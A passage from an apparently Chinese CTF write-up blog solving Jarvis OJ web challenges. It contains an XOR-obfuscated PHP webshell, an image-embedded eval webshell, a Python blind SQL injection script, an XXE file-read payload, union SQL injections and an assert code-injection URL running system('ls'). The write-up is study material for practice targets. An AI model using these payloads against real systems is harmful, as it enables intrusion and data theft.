class="string">'hsh'</span>,$hsh);</span></span><br><span class="line"><span class="php">       &#125;</span></span><br><span class="line"><span class="php">       <span class="keyword">if</span> ($auth) &#123;</span></span><br><span class="line"><span class="php">           <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span></span><br><span class="line"><span class="php">       &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">           <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="php">       &#125;</span></span><br><span class="line"><span class="php">   <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>现在是一波代码审计，从role===”admin”这里看来，我之前的猜测不错，并且hsh值要等于加盐的admin值最后才能拿到flag，这里又是hash拓展长度攻击了…这个之前就一直没搞懂，这里先放一下，立一个严肃的flag，三月底前学会这个hash拓展长度攻击。</p>
<h3 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h3><p>这个题有一丢丢的脑洞在里面，既然是一句话木马，我就联想到文件上传里面包含的一句话，所以就把首页上那个菜刀图给下载了下来，然后Notepad++打开去搜php，2333但是关注点确实不在这里。<br>右键查看源码，这张图片的链接很奇怪，如下图：<br><img src="https://i.loli.net/2018/02/15/5a8494f9b4e87.png" alt=""><br>然后点击管理员登录后/admin显示Forbidden，但是右键源码以后可以看到一组管理员ip(103.27.76.153)提示,虽然这题的Cookie值里也有role这一条，不过没什么用。<br>所以重新构造URL：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=http:/</span><span class="regexp">/103.27.76.153/</span>proxy.php?url=http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/admin</span></span><br></pre></td></tr></table></figure></p>
<p>网站进行扫描以后发现admin目录下有robot.txt这个文件，点开以后里面是：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span>trojan.php</span><br><span class="line"><span class="string">Disallow:</span>trojan.php.txt</span><br></pre></td></tr></table></figure></p>
<p>把trojan.php保存下来运行</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> $&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;=(<span class="string">"!"</span>^<span class="string">"`"</span>).(<span class="string">"( "</span>^<span class="string">"&#123;"</span>).(<span class="string">"("</span>^<span class="string">"["</span>).(<span class="string">"~"</span>^<span class="string">";"</span>).(<span class="string">"|"</span>^<span class="string">"."</span>).(<span class="string">"*"</span>^<span class="string">"~"</span>);$&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;((<span class="string">"-"</span>^<span class="string">"H"</span>). (<span class="string">"]"</span>^<span class="string">"+"</span>). (<span class="string">"["</span>^<span class="string">":"</span>). (<span class="string">","</span>^<span class="string">"@"</span>). (<span class="string">"&#125;"</span>^<span class="string">"U"</span>). (<span class="string">"e"</span>^<span class="string">"A"</span>). (<span class="string">"("</span>^<span class="string">"w"</span>).(<span class="string">"j"</span>^<span class="string">":"</span>). (<span class="string">"i"</span>^<span class="string">"&amp;"</span>). (<span class="string">"#"</span>^<span class="string">"p"</span>). (<span class="string">"&gt;"</span>^<span class="string">"j"</span>). (<span class="string">"!"</span>^<span class="string">"z"</span>). (<span class="string">"T"</span>^<span class="string">"g"</span>). (<span class="string">"e"</span>^<span class="string">"S"</span>). (<span class="string">"_"</span>^<span class="string">"o"</span>). (<span class="string">"?"</span>^<span class="string">"b"</span>). (<span class="string">"]"</span>^<span class="string">"t"</span>));<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>运行以后出现报错信息:</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">Warning</span>: <span class="keyword">assert</span>() [<span class="keyword">function</span>.<span class="keyword">assert</span>]: Assertion <span class="string">"eval($_POST[360])"</span> failed <span class="keyword">in</span> C:\phpstudy\WWW\b.php <span class="keyword">on</span> <span class="literal">line</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>所以密码就是360，最后构造URL：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=http:/</span><span class="regexp">/103.27.76.153/</span>proxy.php?url=http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/admin/</span>trojan.php</span><br></pre></td></tr></table></figure></p>
<p>POST的数据为：<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">360</span>=<span class="string">"ls"</span></span><br></pre></td></tr></table></figure></p>
<p>获取flag：CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}</p>
<h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>题目上一开始就提到，“如果一个漏洞解决不了，那就…”，所以这里我估计至少得有两个漏洞用来利用。<br>然后，熟悉的文件上传，但是直接新建txt文件加入一句话木马后改后缀为.jpg仍然被提示请上传jpg或者gif，我查了一下，这里用的是MIME检测而不是后缀名检测。<br>参考资料：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/xiaojianpitt/</span>article<span class="regexp">/details/</span><span class="number">6856536</span></span><br></pre></td></tr></table></figure></p>
<p>所以重新找了一张图在最后写入一句话木马然后成功上传,上传成功以后生成了一个图片ID，通过访问下面链接就能访问到上传的图片。<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32785/show</span>.php?id=<span class="number">1518677292</span>&amp;<span class="keyword">type</span>=jpg</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/15/5a85394be2c3e.jpg" alt=""><br>到这里以后要留意一个东西上传图片是index.php?page=submit，访问查看图片却是index.php?page=view,测试一下是否是文件包含。<br><img src="https://i.loli.net/2018/02/15/5a85395057c9c.jpg" alt=""><br>测试成功，这里确实是文件包含，所以构造：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/index.php?page=uploads/</span><span class="number">1518679392</span>.jpg</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/15/5a853954bc174.jpg" alt=""></p>
<p>发现后面拼接了一个.php，用%00截断：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/index.php?page=uploads/</span><span class="number">1518679392</span>.jpg%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
<p>但是这里却出问题了，页面上提示说：You should not do this!这里应该是一句话木马里的相关参数被过滤掉了，所以要重新修改一句话木马。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"phP"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'w'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>重新上传，重复上述步骤，最后就能获得flag。<br><img src="https://i.loli.net/2018/02/15/5a853954bc16d.jpg" alt=""><br>flag:CTF{upl0ad_sh0uld_n07_b3_a110wed}</p>
<p>拿到flag以后我又做了一个测试，我上传了一张干净的图片，也是用上面的访问方法再%00截断，但是什么都没有，所以这题就是文件上传+文件包含的题目了，如果上传的文件里的一句话木马被成功解析并且被访问到，就能获取flag。</p>
<h3 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h3><p>好吧，其实我挺怕这类题的，有时候看到估计就直接懵了……诶，逃得过初一逃不过十五，该来的还要来…那就做吧。<br>测试以后，发现username和password是分开判断的，用户名admin，密码123456提示密码错误，但是用户名willard，密码123456却提示用户名错误，因此判断是根据用户名在数据库中查询密码是否存在。<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin'<span class="comment">#&amp;password=123456</span></span><br></pre></td></tr></table></figure></p>
<p>提示密码错误，说明没有过滤’#</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=admin' <span class="keyword">or</span> <span class="attribute">1</span>=1#&amp;password=123456</span><br></pre></td></tr></table></figure>
<p>提示用户名错误，应该是过滤了空格，空格用/**/代替。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin'<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>#&amp;password=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>OK,提示密码密码，这里也没有过滤or。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=user'<span class="comment">/**/</span>or<span class="comment">/**/</span>exists(<span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)#&amp;<span class="keyword">password</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>返回密码错误，说明存在admin表；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=user'<span class="comment">/**/</span>or<span class="comment">/**/</span>exists(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">count</span>(*)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)#&amp;<span class="keyword">password</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>返回密码错误，说明admin表里面只有一条记录，so perfect，所以接下来要判断记录长度了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=user'<span class="comment">/**/</span>or<span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">length</span>(<span class="keyword">password</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)&gt;<span class="number">31</span>#&amp;<span class="keyword">password</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>返回密码错误，最后确定密码就是32位，果断md5加密后的密码！诶，再做一遍还是能学习到不少东西的…比如学会了神奇的脚本sql大法！<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	url=<span class="string">"http://web.jarvisoj.com:32787/login.php"</span></span><br><span class="line">	data=&#123;</span><br><span class="line">		<span class="string">'username'</span>:<span class="string">'xx'</span>,</span><br><span class="line">		<span class="string">'password'</span>:<span class="string">'123456'</span></span><br><span class="line">	&#125;</span><br><span class="line">	payload=<span class="string">"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line">	chars=<span class="string">"0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">			char_ascii=ord(j)</span><br><span class="line">			sql_payload=payload.format(i,char_ascii)</span><br><span class="line">			data[<span class="string">'username'</span>]=sql_payload</span><br><span class="line">			<span class="comment">#因为注入点在username上</span></span><br><span class="line">			rep=requests.post(url=url,data=data)</span><br><span class="line">			length=len(rep.text)</span><br><span class="line">			<span class="keyword">if</span> length&gt;<span class="number">1191</span>:</span><br><span class="line">				result+=j</span><br><span class="line">				<span class="keyword">print</span> result</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span> result</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Done"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/15/5a855ed6e73f6.jpg" alt=""><br>md5解码后为：eTAloCrEP<br>成功登录:flag:CTF{s1mpl3_1nJ3ction_very_easy!!} </p>
<h3 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h3><p>看到那个熟悉的框框以后我的第一反应就是XXE（之前在SWPUCTF中做过类似的），推荐一篇关于XXE漏洞的分析：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>thief.one<span class="regexp">/2017/</span><span class="number">06</span><span class="regexp">/20/</span><span class="number">1</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p>直接构造xml语句POST,再把Content-Type修改为application/xml：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY file SYSTEM "file:////home/ctf/flag.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/16/5a85c50f65847.jpg" alt=""><br>flag:CTF{XxE_15_n0T_S7range_Enough}</p>
<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>挺简单的一道题，打开以后是index.php，抓包以后没有发现特殊的地方，也不是源码泄露，然后就想到了robots.txt，打开以后有提示：<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Disallow:</span> /admin_s3cr3t.php</span><br></pre></td></tr></table></figure></p>
<p>修改链接，抓包以后COOKIE参数里的参数admin=0，修改admin=1就能拿到flag。<br>flag:flag{hello_admin~}</p>
<h3 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h3><p>题目HINT已经说了找源码，测试以后在index.php~下找到源码。<br><img src="https://i.loli.net/2018/02/16/5a86810f648d8.jpg" alt=""><br>源码下面有一个不知道是什么的Filter过滤（撑脸…），所以只能自己测试，desc是降序排列，desc后面跟着`，在sql里面，两个连续的``可以被看作空格，注入语句如下：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32794/index</span>.php?table=flag<span class="string">` `</span>where <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1</span></span><br></pre></td></tr></table></figure></p>
<p>成功注入：<br><img src="https://i.loli.net/2018/02/16/5a86810f695ab.jpg" alt=""><br>修改select 1为select 1,2测试以后只有1列，下面查表：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32794/index</span>.php?table=flag<span class="string">` `</span>where <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">TABLE_NAME</span> <span class="title">from</span> <span class="title">information_schema</span>.<span class="title">tables</span></span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/16/5a86810f76d85.jpg" alt=""><br>获取表名，下面查列：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32794/index</span>.php?table=flag<span class="string">` `</span>where <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">COLUMN_NAME</span> <span class="title">from</span> <span class="title">information_schema</span>.<span class="title">columns</span></span></span><br></pre></td></tr></table></figure></p>
<p>拿flag：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32794/index</span>.php?table=flag<span class="string">` `</span>where <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span>  <span class="title">flagUwillNeverKnow</span> <span class="title">from</span> <span class="title">secret_flag</span></span></span><br></pre></td></tr></table></figure></p>
<p>flag:flag{luckyGame~} </p>
<h3 id="babayphp"><a href="#babayphp" class="headerlink" title="babayphp"></a>babayphp</h3><p><img src="https://i.loli.net/2018/02/16/5a868e916d1ca.jpg" alt=""><br>看到Git猜测有Git源码泄露，进行测试：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32798</span><span class="regexp">/.git/</span>config</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/16/5a868e91a3a25.jpg" alt=""><br>果然如此，上GitHacker！源码有两部分组成，一个index.php，还有template下面的几个php文件，除了index.php，其他的没用。<br>index.php<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">if (isset($_GET['page'])) &#123;</span></span><br><span class="line"><span class="xml">	$page = $_GET['page'];</span></span><br><span class="line"><span class="xml">&#125; else &#123;</span></span><br><span class="line"><span class="xml">	$page = "home";</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">$file = "templates/" . $page . ".php";</span></span><br><span class="line"><span class="xml">assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");</span></span><br><span class="line"><span class="xml">assert("file_exists('$file')") or die("That file doesn't exist!");</span></span><br><span class="line"><span class="xml">?&gt;</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>My PHP Website<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-inverse navbar-fixed-top"</span>&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		    	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		    		<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle collapsed"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#navbar"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span> <span class="attr">aria-controls</span>=<span class="string">"navbar"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Project name<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">		        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"navbar"</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"home"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=home"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"about"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"contact"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=contact"</span>&gt;</span>Contact<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">						<span class="comment">&lt;!--&lt;li &lt;?php if ($page == "flag") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?page=flag"&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">		        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top: 50px"</span>&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">				require_once $file;</span></span><br><span class="line"><span class="xml">			?&gt;</span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-latest.js"</span> /&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js"</span> /&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这次的代码审计很简单，看到assert的时候（苍蝇式兴奋搓脚）这果断代码执行！<br>但是它有一个文件检测机制，所以构造的时候先构造一个存在于templates的文件，比如之前通过GitHacker拿下来的flag.php,再加上代码执行语句。<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//web.jarvisoj.com:32798/?page=flag'.system("ls").'</span></span><br></pre></td></tr></table></figure></p>
